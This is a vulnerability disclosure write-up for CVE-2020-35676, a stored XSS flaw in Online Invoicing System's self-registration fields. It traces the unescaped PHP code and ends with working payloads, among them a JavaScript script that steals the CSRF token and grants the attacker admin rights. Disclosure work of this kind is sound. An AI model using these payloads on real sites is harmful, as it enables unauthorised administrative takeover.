---
layout: post
title: CVE-2020-35676
tags: [CVE, PHP, XSS]
author: Ingredous Labs
comment: true
---

```
Software Name: Online Invoicing System
Software Version: < 3.1
Software Developer: https://bigprof.com/
Link to Software: https://github.com/bigprof-software/online-invoicing-system
Vulnerability: Application Takeover via Stored XSS
CVE ID: CVE-2020-35676
```

# Introduction

Online Invoicing System fails to correctly sanitize user input when a user registers using the self-registration functionality. As such, an attacker can input a specially crafted payload that will execute upon the application's administrator browsing the registered user's list. Once the arbitrary Javascript is executed in the context of the admin, this will cause the attacker to gain administrative privileges therefore effectively leading into an application takeover.

# Exploitation Details

**PHP Version used throughout this writeup: PHP 7.4.8**

In order to allow user's to self-register, the following pre-requisites need to be met:

1. Sign up has to be enabled in `admin/pageSettings.php` (enabled by default during a fresh install.) 
2. Custom group has to be created which would contain the self-signed up users. 

Upon these two pre-reqs being met, a user is able to self-register by browsing to `http://localhost/membership_signup.php`.

When registering, a user sees the following fields:

![Screenshot]({{ site.baseurl }}/images/posts/2020/ois-xss1/fields.png)

The majority fields are optional apart from:

~~~
Username
Password
Confirm Password
Email
Group
~~~

Let's take a peek in the code to see what happens to the values of these fields after this information is passed to the server.

`app/membership_signup.php`:

![Screenshot]({{ site.baseurl }}/images/posts/2020/ois-xss1/fieldsbackend.png)

As shown on Lines 3-11 above, multiple variables are initialized with the values of the user-input after being passed into various functions. Then on Lines 14-32, the data is validated to ensure the username does not exist, the passwords match, etc. Finally on Line 37, a SQL query is crafted using the user input and executed thus storing the registered user's information in the database.

However Lines 8-11, look very interesting:

~~~
$custom1 = makeSafe($_POST['custom1']);
$custom2 = makeSafe($_POST['custom2']);
$custom3 = makeSafe($_POST['custom3']);
$custom4 = makeSafe($_POST['custom4']);
~~~

The lines above take the values that are passed into each respective parameter that starts with the name "custom". Looking at the HTML of the sign-up form, we can confirm these correspond with the optional fields: 

~~~
Full Name
Address
City 
State
~~~


What's most interesting here is that before these values are initialized with their respective variable, the values are first passed into the `makeSafe()` function. The `makeSafe()` function is dissected in the following [writeup](https://labs.ingredous.com/2020/07/13/ois-sqli/). Long story short, the `makeSafe()` function is responsible for essentially catching and dealing with any special characters that could result in a SQL Injection. An example of such special characters are null bytes, single quotes, line feeds, carriage returns, etc. 

So while the `makeSafe()` function may help prevent SQL Injection attacks, it has no role in sanitizing HTML. As no HTML characters are being sanitized, the database is directly storing the HTML payloads unharmed. 

While this is a red flag, it is not appropriate to jump to conclusions as there could be additional functionality which sanitizes the value stored in the database before reflecting it onto the page.

To confirm this, we can take a look at the code which is responsible for displaying these values to the administrator.

**admin/pageViewMembers.php**:
![Screenshot]({{ site.baseurl }}/images/posts/2020/ois-xss1/reflectme.png)

As shown on Line 1, a SQL query is executed to retrieve the values of the following columns:

~~~
m.memberID - Column 0
g.name - Column 1
m.signupDate - Column 2
m.custom1 - Column 3
m.custom2 - Column 4
m.custom3 - Column 5
m.custom4 - Column 6
...
~~~

On Line 2, a while loop is used to iterate over the values of each column. The index here corresponds with the index of the columns being listed above such as `$row[0]` being the memberID (m.memberID), `$row[1]` being the group name (g.name) and so on.

With this in mind, this means that the values of the custom fields will be stored in:

~~~
$row[3] // Full Name
$row[4] // Address
$row[5] // City
$row[6] // State
~~~

Finally each of these values are passed into the `thisOr()` function in which the returned value is directly reflected on to the page:

~~~php
<td class="text-left"><?php echo thisOr($row[1]); ?></td>
<td class="text-left"><?php echo thisOr($row[2]); ?></td>
<td class="text-left"><?php echo thisOr($row[3]); ?></td>
<td class="text-left"><?php echo thisOr($row[4]); ?></td>
<td class="text-left"><?php echo thisOr($row[5]); ?></td>
<td class="text-left"><?php echo thisOr($row[6]); ?></td>
<td class="text-left">
    <?php echo (($row[7] && $row[8]) ? $Translation['Banned'] : ($row[8] ? $Translation['active'] : $Translation['waiting approval'] )); ?>
</td>
~~~

Let's take a quick peek into the `thisOr()` function as it is the last step between successful exploitation as it may be the function which could be responsible for sanitizing the items.

**admin/incFunctions.php**:

![Screenshot]({{ site.baseurl }}/images/posts/2020/ois-xss1/thisor.png)

As shown above, the `thisOr()` function performs a simple ternary operation which checks if the value of the parameter passed to it is empty. If the value is not empty, it is returned as is. However if the value is empty, a non-breaking space HTML entity is returned.

Since `thisOr()` was the final thing standing between succesful exploitation and not, we can now confirm that the application is indeed vulnerable to Stored Cross-Site Scripting as the application fails to sanitize the user-input for any HTML special characters which can lead to exploitation.

With this in mind, an attacker is able to use Javascript to craft a payload which would grant their account the highest privileges offered by the application. After sending the payload when creating a new user, an attacker will need to wait until the application's administrator browses to the user list which would therefore execute the payload. As the payload is executed in the context of the application, the Same Origin Policy is therefore bypassed and an attacker is able to effectively takeover the application.

# Proof of Concept

Basic:

```
Full Name - <img src=/ onerror=alert(1)>
Address - <img src=/ onerror=alert(2)>
City - <img src=/ onerror=alert(3)>
State - <img src=/ onerror=alert(4)>
```

Bypass SOP and grant yourself admin rights:

```javascript
// add-admin.js
var req = new XMLHttpRequest();
var url = ""+ "/admin/pageEditMember.php?saved=1&memberID=attacker";
var regex = /csrf_token" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "csrf_token="+nonce+"&oldMemberID=attacker&memberID=attacker&password=&confirmPassword=&email=attacker%40testing.io&groupID=2&isApproved=1&custom1=testing&custom2=123+Fake+St&custom3=London&custom4=New+York&comments=Test&saveChanges=1";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
```

**Replace**:
The values of `oldMemberID` and `memberID` with your respective username.

